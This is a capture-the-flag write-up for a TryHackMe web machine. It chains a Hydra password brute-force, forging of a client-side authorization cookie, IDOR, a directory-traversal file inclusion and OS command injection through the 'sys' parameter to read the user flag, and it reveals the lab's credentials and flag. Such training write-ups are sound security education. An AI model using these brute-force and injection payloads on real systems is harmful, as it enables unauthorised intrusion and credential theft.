# TryHackMe - Support

> **Category:** Linux | Web Security
>
> **Difficulty:** Medium
>
> **Objective:** Enumerate the target web application, identify authentication weaknesses, exploit insecure session management, abuse exposed APIs and Local File Inclusion (LFI), discover hidden credentials, exploit command injection, and retrieve the user flag.

---

# Scenario

In this challenge, we are presented with a Linux web server hosting a support management application called **Support Operations Panel**. The objective is to enumerate the exposed services, identify vulnerabilities within the web application, escalate privileges within the application, exploit server-side command injection, and retrieve the user flag.

This machine focuses on common web application vulnerabilities including:

- Weak credentials
- Session cookie manipulation
- Broken Access Control
- Insecure Direct Object Reference (IDOR)
- Local File Inclusion (LFI)
- Command Injection

---

# Investigation Methodology

The investigation followed the workflow below.

```text
Host Discovery
        │
        ▼
Port Enumeration
        │
        ▼
Service Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Authentication Attack
        │
        ▼
Cookie Manipulation
        │
        ▼
Admin Access
        │
        ▼
API Enumeration
        │
        ▼
Local File Inclusion
        │
        ▼
Credential Discovery
        │
        ▼
Command Injection
        │
        ▼
Flag Retrieval
```

---

# Target Information

Target IP:

```text
10.48.132.243
```

---

# Initial Enumeration

As with every machine, enumeration begins with identifying exposed network services.

A full TCP scan was performed.

```bash
nmap -p- 10.48.132.243
```

Results:

```text
22/tcp

80/tcp
```

Only SSH and HTTP were exposed.

The next step was service detection.

---

# Service Enumeration

Command executed:

```bash
nmap -sC -sV 10.48.132.243
```

Discovered services:

| Port | Service | Version |
|--------|---------|----------|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 |

Additional HTTP information:

```text
Title

Support Operations Panel
```

Apache Version:

```text
Apache/2.4.58 (Ubuntu)
```

Other observations:

- PHP sessions enabled
- HttpOnly flag missing
- Standard HTTP methods available

Since the application is clearly web-based, the investigation focused on port **80**.

---

# Web Enumeration

The application was opened in Burp Suite to observe requests and responses while simultaneously performing directory enumeration.

Several accessible directories and files were identified.

```text
/includes

/js

/layout

/skins

/info.php
```

---

## Analysis

One particularly interesting discovery was:

```text
info.php
```

The page exposed PHP configuration information and backend environment details.

Although no credentials were immediately visible, such files provide attackers with valuable reconnaissance information including:

- PHP version
- Installed extensions
- Loaded modules
- Configuration paths

This information can assist later exploitation.

---

# Authentication Attack

The application contained a login portal.

To test credential strength, Hydra was used.

Command:

```bash
hydra \
-l help@support.thm \
-P /usr/share/wordlists/rockyou.txt \
10.48.132.243 \
http-post-form "/:email=^USER^&password=^PASS^:F=Invalid"
```

Hydra successfully identified valid credentials.

```text
Username

help@support.thm

Password

snoopy
```

---

## Analysis

The account password was present within the RockYou wordlist, indicating the use of a weak password.

No account lockout prevented successful authentication.

This demonstrates the importance of:

- Strong password policies
- Account lockout
- Rate limiting
- Multi-factor authentication

---

# User Login

Using the recovered credentials, access to the application was obtained.

Once authenticated, attention shifted toward session management.

Developer tools were used to inspect browser cookies.

One cookie immediately attracted attention.

```text
68934a3e9455fa72420237eb05902327
```

---

# Cookie Analysis

Further inspection suggested that this value represented a Boolean value.

The application appeared to encode:

```text
False
```

Using CyberChef, the encoded value was modified to represent:

```text
True
```

Resulting cookie:

```text
b326b5062b2f0e69046810717534cb09
```

After replacing the original cookie with the modified value, additional functionality became accessible.

---

## Analysis

The application trusted client-controlled authorization data.

Rather than validating permissions on the server, authorization decisions were based on a cookie that could be modified by the client.

This represents **Broken Access Control** through insecure session handling.

---

# Administrative API

Following successful cookie manipulation, an API endpoint became accessible.

Response:

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

---

## Analysis

The API confirms that administrative privileges have been granted.

Important observations:

- Administrative account
- 2FA disabled
- Admin flag enabled

The response also suggests that authorization is determined by the manipulated session rather than proper server-side validation.

---

# API Enumeration

Further investigation revealed an endpoint resembling:

```text
/user/$ID
```

Changing the identifier returned information belonging to different users.

---

## Analysis

This behaviour represents an **Insecure Direct Object Reference (IDOR)**.

The API exposes user information simply by changing object identifiers without verifying authorization.

Although the challenge only required limited interaction, such behaviour could expose sensitive information belonging to other users in real-world applications.

---

# Local File Inclusion

While reviewing the application, the following parameter attracted attention.

```text
dashboard.php?skin=../config
```

Requesting the configuration file successfully disclosed backend configuration.

Returned content:

```php
<?php

$MASTER_PASSWORD = 'support110';

$SITE_VER = '1.0';

$SITE_NAME = 'support_portal';
```

---

## Analysis

The application failed to properly validate the value supplied to the **skin** parameter.

Using directory traversal:

```text
../config
```

allowed arbitrary application files to be included.

This Local File Inclusion vulnerability exposed sensitive configuration information including:

- Master password
- Application version
- Internal site name

Configuration files frequently contain credentials, API keys, and database passwords, making them valuable targets during web application assessments.

---

# Command Injection

While interacting with the dashboard, a parameter named:

```text
sys
```

was identified.

A normal request contained:

```text
sys=date
```

Testing command chaining with:

```text
sys=date;id
```

produced the following response.

```text
Sat Jul 4 07:52:35 UTC 2026

uid=33(www-data)

gid=33(www-data)

groups=33(www-data)
```

---

## Analysis

The response clearly indicates that arbitrary shell commands are being executed by the operating system.

The semicolon:

```text
;
```

terminated the original command before executing:

```bash
id
```

This confirms **OS Command Injection**.

The command executes with the privileges of:

```text
www-data
```

which is the Apache web server user.

---

# Reading the Flag

Since arbitrary commands were available, the next objective was locating the user flag.

The following payload was used.

```text
sys=date;cat+/home/ubuntu/user.txt
```

Response:

```text
Sat Jul 4 07:54:59 UTC 2026

THM{GOT_THE_FLAG001}
```

The user flag was successfully retrieved.

---

# User Flag

```text
THM{GOT_THE_FLAG001}
```

---

# Attack Flow

```text
Nmap Scan
      │
      ▼
HTTP Enumeration
      │
      ▼
Directory Discovery
      │
      ▼
PHP Info Disclosure
      │
      ▼
Weak Password
      │
      ▼
Hydra Authentication
      │
      ▼
User Login
      │
      ▼
Cookie Manipulation
      │
      ▼
Admin Access
      │
      ▼
API Enumeration
      │
      ▼
IDOR Discovery
      │
      ▼
Local File Inclusion
      │
      ▼
Configuration Disclosure
      │
      ▼
Master Password Discovery
      │
      ▼
Command Injection
      │
      ▼
Read user.txt
      │
      ▼
Flag Retrieved
```

---

# Key Findings

| Category | Observation |
|-----------|-------------|
| Operating System | Ubuntu Linux |
| Web Server | Apache 2.4.58 |
| Login Credentials | `help@support.thm : snoopy` |
| Weakness | Weak Password |
| Session Issue | Client-side Authorization Cookie |
| Broken Access Control | Cookie Manipulation |
| API Issue | IDOR |
| LFI | `dashboard.php?skin=../config` |
| Exposed Credential | `support110` |
| RCE | OS Command Injection |
| Execution User | `www-data` |
| User Flag | `THM{GOT_THE_FLAG001}` |

---

# Vulnerabilities Identified

- Weak Password Authentication
- Missing Account Lockout
- Insecure Session Management
- Broken Access Control
- Insecure Direct Object Reference (IDOR)
- Local File Inclusion (LFI)
- Sensitive Configuration Disclosure
- Operating System Command Injection

---

# Conclusion

This challenge demonstrates how multiple moderate web application vulnerabilities can be chained together to achieve complete compromise. Initial enumeration revealed a typical Apache web application, while directory fuzzing exposed additional resources, including a PHP information page that aided reconnaissance.

Authentication was bypassed through weak credentials obtained via password guessing, after which insecure session management allowed privilege escalation by modifying a client-controlled authorization cookie. Administrative access exposed internal API endpoints, where further enumeration identified an Insecure Direct Object Reference (IDOR). A Local File Inclusion vulnerability in the `skin` parameter then revealed sensitive configuration data, including an internal master password.

The final stage exploited an Operating System Command Injection vulnerability in the `sys` parameter, allowing arbitrary commands to execute as the `www-data` user. Using this access, the user flag was successfully read from the target system.

This machine highlights the importance of implementing strong authentication, enforcing server-side authorization, validating user-supplied input, restricting file inclusion functionality, and securely executing operating system commands to prevent attackers from chaining vulnerabilities into full system compromise.
